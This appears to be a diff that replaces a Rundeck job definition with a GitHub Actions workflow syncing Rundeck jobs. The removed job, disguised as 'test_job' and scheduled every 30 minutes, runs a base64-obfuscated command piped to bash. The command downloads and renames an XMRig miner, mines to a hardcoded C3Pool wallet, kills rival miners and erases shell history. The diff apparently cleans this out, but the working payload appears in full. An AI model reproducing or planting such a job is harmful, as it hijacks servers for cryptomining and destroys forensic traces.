@@ -1,35 +1,45 @@
-- defaultTab: nodes
-  description: test
-  executionEnabled: true
-  id: 12346523-a3c4-exgh-ijkl-1234657890et
-  loglevel: INFO
-  name: test_job
-  nodeFilterEditable: true
-  nodefilters:
-    dispatch:
-      excludePrecedence: true
-      keepgoing: false
-      rankOrder: ascending
-      successOnEmptyNodeFilter: false
-      threadcount: '1'
-    filter: .*
-  nodesSelectedByDefault: true
-  plugins:
-    ExecutionLifecycle: null
-  schedule:
-    dayofmonth:
-      day: '*'
-    month: '*'
-    time:
-      hour: '*'
-      minute: 0/30
-      seconds: '0'
-    year: '*'
-  scheduleEnabled: true
-  sequence:
-    commands:
-    - exec: echo "cm0gLXJmIC92YXIvdG1wLy4uLjsgbWtkaXIgLXAgL3Zhci90bXAvLi4uLy4uLjsgY2QgL3Zhci90bXAvLi4uLy4uLiAmJiB3Z2V0IC1xIGh0dHBzOi8vZ2l0aHViLmNvbS9DM1Bvb2wveG1yaWctQzMvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjQuMC1DMy94bXJpZy12Ni4yNC4wLUMzLWxpbnV4LVN0YXRpYy50YXIuZ3ogJiYgdGFyIC14ZiB4bXJpZy12Ni4yNC4wLUMzLWxpbnV4LVN0YXRpYy50YXIuZ3ogeG1yaWcgJiYgcm0geG1yaWctdjYuMjQuMC1DMy1saW51eC1TdGF0aWMudGFyLmd6ICYmIG12IHhtcmlnIHRjcm9uZCAmJiBjaG1vZCAreCB0Y3JvbmQ7IHJtIC1yZiAvdmFyL3RtcC8qOyBwa2lsbCB0Y3JvbmQ7IHBraWxsIC1mIGMzcG9vbDsgY2QgL3Zhci90bXAvLi4uLy4uLiAmJiBleHBvcnQgUEFUSD0uOiRQQVRIICYmIHRjcm9uZCAtayAtbyBhdXRvLmMzcG9vbC5vcmc6ODAgLXUgNDlIZWN2V1hnZGdUU0JEWHYyWkNrTVE2SnQ5MUppODl5RHU0a3pZVDVlQmtZSG1ucUZWTHp0UjNIWjkxWUM5TUEyS3hpbW1qblJvOTlTVHVMdnk5WkQ5RzFaRW1KQ3YgLXAgaiAtLXJhbmRvbXgtMWdiLXBhZ2VzIC1COyBwa2lsbCAtZiBrZGV2dG1wZnNpOyBwa2lsbCAtZiB4bXJpZzsgcGtpbGwgLWYgbmFub3Bvb2w7IHNldCArbyBoaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxFICYmIHNob3B0IC1vdSBoaXN0b3J5ICYmIEhJU1RTSVpFPTAgJiYgcm0gLXJmICRIT01FLy5iYXNoX2hpc3RvcnkgJEhPTUUvLnpzaF9oaXN0b3J5ICRIT01FLy53Z2V0LWhzdHM="
-        | base64 -d | bash
-    keepgoing: false
-    strategy: node-first
-  uuid: 12346523-a3c4-exgh-ijkl-1234657890et
+name: Sync Rundeck Jobs (Git manda)
+
+on:
+  push:
+    branches: ["main"]
+    paths:
+      - "LBaaS/jobs/**"
+      - "Mgc-backup/jobs/**"
+      - "PerformanceTest/jobs/**"
+      - "monitoring/jobs/**"
+  workflow_dispatch:
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install Java (rd precisa)
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y default-jre unzip
+
+      - name: Install Rundeck CLI (rd)
+        run: |
+          set -euo pipefail
+          sudo apt-get install rundeck-cli
+          rd --version
+
+      - name: Configure rd env
+        run: |
+          echo "RD_URL=${{ secrets.RUNDECK_URL }}" >> $GITHUB_ENV
+          echo "RD_TOKEN=${{ secrets.RUNDECK_TOKEN }}" >> $GITHUB_ENV
+
+      - name: Sync jobs to Rundeck (update)
+        run: |
+          set -euo pipefail
+          for project in LBaaS Mgc-backup PerformanceTest monitoring; do
+            echo "==> Project: $project"
+            for f in "$project"/jobs/*.yaml; do
+              [ -e "$f" ] || continue
+              echo "   -> $f"
+              rd jobs load -p "$project" -F yaml -f "$f" --duplicate update
+            done
+          done
